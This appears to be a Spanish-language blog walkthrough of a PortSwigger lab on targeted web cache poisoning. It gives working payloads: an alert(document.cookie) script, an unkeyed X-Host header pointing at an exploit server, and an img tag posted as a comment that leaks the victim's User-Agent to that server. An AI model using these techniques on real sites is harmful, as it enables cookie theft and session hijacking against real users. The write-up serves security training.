---
title: Targeted web cache poisoning using an unknown header
description: Laboratorio de Portswigger sobre Web Cache Poisoning
date: 2025-08-12 12:30:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - Web Cache Poisoning
tags:
  - Portswigger Labs
  - Web Cache Poisoning
  - Targeted web cache poisoning using an unknown header
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

`Este laboratorio contiene una vulnerabilidad de web cache poisoning`. `Un usuario visita la sección de comentarios cada vez que publicamos uno`. Para `resolver` este `laboratorio`, tenemos que `envenenar la caché con una respuesta que ejecute alert(document.cookie) en el navegador de la víctima`. También tenemos que `asegurarnos` de que `la respuesta se sirve al subconjunto específico de usuarios al que pertenece la víctima`

---

## Resolución

Al `acceder` a la `web` vemos `esto`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_1.png)

El `primer paso` es `añadir` el `dominio` al `scope`, para ello `pulsamos` en `Target > Scope > Add y añadimos el dominio`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_2.png)

El `segundo paso` es `identificar y evaluar entradas unkeyed`, para ello vamos `primero` a `crawlear` la `web` con `Burpsuite` y a `navegar manualmente por ella`. Para hacer esto nos dirigimos a `Target > Site map > Click derecho sobre el dominio > Scan`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_3.png)

`Seleccionamos` la `opción` de `Crawl` y `pulsamos` sobre `Scan`. `Mientras Burpsuite crawlea la web, vamos a navegar por ella de forma manual`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_4.png)

`Una vez haya terminado el escaneo, vamos a usar la extensión Param miner para identificar entradas unkeyed`. Debemos hacer `click derecho sobre el dominio > Extensions > Param Miner > Guess everything!`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_5.png)

Vemos que `Param Miner` ha `descubierto` que las cabeceras `X-Host`, `Origin` y `Via` son `unkeyed`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_6.png)

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_7.png)

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_8.png)

También vemos que `en todas las respuestas del servidor está la cabecera Vary`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_9.png)

`Si buscamos en google que es lo que hace esta cabecera obtenemos esta respuesta`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_10.png)

En nuestro caso, `la cabecera Vary tiene el valor User-agent`, lo cual `significa` que `dependiendo del User-agent que tengamos vamos a tener una clave caché diferente`. Esto se debe a que `el User-agent se está usando para generar la clave caché`, por lo tanto, `el ataque de web cache poisoning solo funcionará para los usuarios que tengan el mismo User-agent que nosotros`

`Teniendo lo anteriormente mencionado en cuenta`, vamos a `comprobar` si `algún valor de las cabeceras unkeyed descubiertas se refleja en la respuesta`. Cuando `enviamos` la `petición` vemos que `el valor de la cabecera X-Host se refleja en la respuesta`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_11.png)

Una vez sabemos esto, nos `dirigimos` al `Exploit server` y `cambiamos la ruta de nuestro exploit y el content type`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_12.png)

`En el body pegamos este payload` y `pulsamos` en `Store`

```
alert(document.cookie)
```

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_13.png)

`Eliminamos las otras dos cabeceras e insertamos la cabecera X-Host con el dominio de nuestro Exploit server como valor`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_14.png)

`Enviamos la petición nuevamente para comprobar que el contenido de la respuesta está siendo cargado desde la caché`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_15.png)

Ahora, si `accedemos` al `directorio raíz de la página web` nos `saltará` un `alert`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_16.png)

Sin embargo, como hemos mencionado antes, `debido a que se tiene en cuenta el User-agent para generar la clave de caché, si el usuario víctima tiene un User-agent diferente a nosotros no se le ejecutará el exploit porque su clave de caché es diferente`. Para solucionar esto, podemos `intentar obtener el User-agent de la víctima mediante este payload`, el cual vamos a `enviar a través de la sección de comentarios`

```
<img src=https://exploit-0a29005303b71d7c84d2036f01690045.exploit-server.net/SoyLaVictima>
```

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_17.png)

Si nos `dirigimos` al `Access log` de nuestro `Exploit server` veremos que `hemos obtenido el User-agent del usuario víctima`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_18.png)

`Enviamos la petición que hemos enviado anteriormente pero con el User-agent del usuario víctima`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_19.png)

Ahora tenemos que `esperar a que la víctima acceda al directorio raíz /`. `Si la víctima no accede en un período de 30 segundos, tendremos que volver a enviar la petición y seguir haciéndolo hasta que acceda`. `Sabremos que la víctima a visitado el directorio raíz / porque nos saldrá este mensaje en pantalla`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_20.png)

`Si no queremos mandar la petición manualmente cada 30 segundos`, podemos `enviar` la `petición` al `Intruder`, `seleccionar Sniper como tipo de ataque`, `marcar un lugar aleatorio en el que inyectar los payloads`, `seleccionar null payloads como tipo de payload`, `en Payloads configuration marcar la opción Continue indefinitely` y `desactivar el URL encoding`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_21.png)

En la parte de `Resource pool`, tenemos que `crear` una `pool` que `tenga un delay de 30 segundos entre peticiones y que se mande solamente 1 petición a la vez`. `Si queremos asegurarnos de que siempre está activo podemos poner un valor más bajo, 20 o 25 segundos por ejemplo`

![](/assets/img/Web-Cache-Poisoning-Lab-4/image_22.png)



